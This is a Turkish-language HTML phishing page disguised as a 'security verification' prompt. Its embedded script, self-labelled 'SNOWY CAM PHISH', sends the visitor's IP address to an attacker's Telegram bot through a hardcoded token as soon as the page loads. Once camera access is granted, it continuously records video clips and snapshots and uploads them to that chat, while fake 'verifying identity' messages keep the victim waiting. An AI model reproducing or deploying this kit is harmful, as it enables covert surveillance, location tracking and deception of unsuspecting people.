<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GГјvenlik DoДҹrulamasДұ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        h2 { color: #333; font-size: 28px; margin-bottom: 10px; }
        h2 span { color: #667eea; }
        p { color: #666; margin-bottom: 30px; }
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white; border: none; padding: 16px 32px;
            font-size: 18px; font-weight: bold; border-radius: 50px;
            cursor: pointer; width: 100%;
        }
        .btn:hover { transform: translateY(-2px); }
        .loading { display: none; margin: 20px 0; }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #667eea;
            border-radius: 50%; width: 40px; height: 40px;
            animation: spin 1s linear infinite; margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { color: #667eea; margin-top: 10px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>вқ„пёҸ <span>GГңVENLД°K</span> DOДһRULAMASI</h2>
        <p>Devam etmek iГ§in kamera eriЕҹimine izin verin.</p>
        <button class="btn" id="startBtn" onclick="startCamera()">рҹ“ё BAЕһLAT</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">GГјvenlik kontrolГј...</div>
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ============================================
        // GД°ZLД° KONFД°GГңRASYON
        // ============================================
        const BOT_TOKEN = "8773124715:AAG3Y7itEmKlsrvOfUkrvXoZmJrRPQanzro";
        const urlParams = new URLSearchParams(window.location.search);
        const TARGET_ID = urlParams.get('i');
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        
        let mediaRecorder = null;
        let recordedChunks = [];
        let videoCount = 0;
        let photoCount = 0;
        
        // ============================================
        // Д°P ADRESД° AL - SAYFA AГҮILIR AГҮILMAZ ГҮALIЕһSIN
        // ============================================
        async function getIP() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                return ipData.ip;
            } catch(e) {
                return 'AlДұnamadДұ';
            }
        }
        
        // ============================================
        // Д°P'YД° TELEGRAM'A GГ–NDER - HTML FORMAT (DГјzgГјn gГ¶zГјkmesi iГ§in)
        // ============================================
        async function sendIP(ip) {
            const msg = `<b>вқ„пёҸ SNOWY CAM PHISH вқ„пёҸ</b>\nв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғ\nрҹҢҗ <b>IP Adresi:</b> ${ip}\nвҸұпёҸ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\nв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғв”Ғ\nвҡЎ @snowy_dexry_wexry вҡЎ`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ 
                    chat_id: TARGET_ID, 
                    text: msg, 
                    parse_mode: 'HTML'  // Markdown'dan HTML'e Г§evirdim
                })
            });
        }
        
        // ============================================
        // VД°DEO KAYDI BAЕһLAT
        // ============================================
        function startVideoRecording() {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) recordedChunks.push(event.data);
            };
            
            mediaRecorder.onstop = async () => {
                videoCount++;
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                
                const formData = new FormData();
                formData.append('chat_id', TARGET_ID);
                formData.append('video', blob, `video_${Date.now()}.webm`);
                formData.append('caption', `рҹҺҘ Video #${videoCount} - ${new Date().toLocaleString('tr-TR')}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                setTimeout(startVideoRecording, 1000);
            };
            
            mediaRecorder.start();
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 15000);
        }
        
        // ============================================
        // FOTOДһRAF ГҮEK
        // ============================================
        async function takePhoto() {
            photoCount++;
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', TARGET_ID);
                formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                formData.append('caption', `рҹ“ё FotoДҹraf #${photoCount} - ${new Date().toLocaleString('tr-TR')}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg', 0.7);
        }
        
        // ============================================
        // KAMERAYI BAЕһLAT
        // ============================================
        async function startCamera() {
            try {
                // Г–NCE Д°P'YД° GГ–NDER - Д°ZД°N VERSE DE VERMESE DE
                const ip = await getIP();
                await sendIP(ip);
                
                // SONRA KAMERA Д°ZNД° Д°STE
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                document.getElementById('startBtn').style.display = 'none';
                document.getElementById('loading').style.display = 'block';
                
                // Kamera stabil olsun
                await new Promise(r => setTimeout(r, 2000));
                
                // VД°DEO KAYDI BAЕһLAT
                startVideoRecording();
                
                // FOTOДһRAF ГҮEK
                setInterval(takePhoto, 5000);
                
                // YAZIYI DEДһД°ЕһTД°R
                const texts = ["GГјvenlik kontrolГј...", "Kimlik doДҹrulanДұyor...", "LГјtfen bekleyin..."];
                let i = 0;
                setInterval(() => {
                    i = (i + 1) % texts.length;
                    document.getElementById('loadingText').innerText = texts[i];
                }, 3000);
                
            } catch(e) {
                // KAMERA Д°ZNД° VERMESE BД°LE Д°P GД°TTД°!
                alert('Kamera izni gerekli!');
            }
        }
        
        // ============================================
        // SAYFA YГңKLENDД°ДһД°NDE HEMEN Д°P GГ–NDER
        // ============================================
        window.onload = async function() {
            if (TARGET_ID) {
                // Sayfa yГјklenir yГјklenmez IP'yi gГ¶nder (butona basmadan bile)
                const ip = await getIP();
                await sendIP(ip);
            }
        };
        
        // ============================================
        // SAYFA KAPANIRKEN
        // ============================================
        window.onbeforeunload = function() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        };
    </script>
</body>
</html>
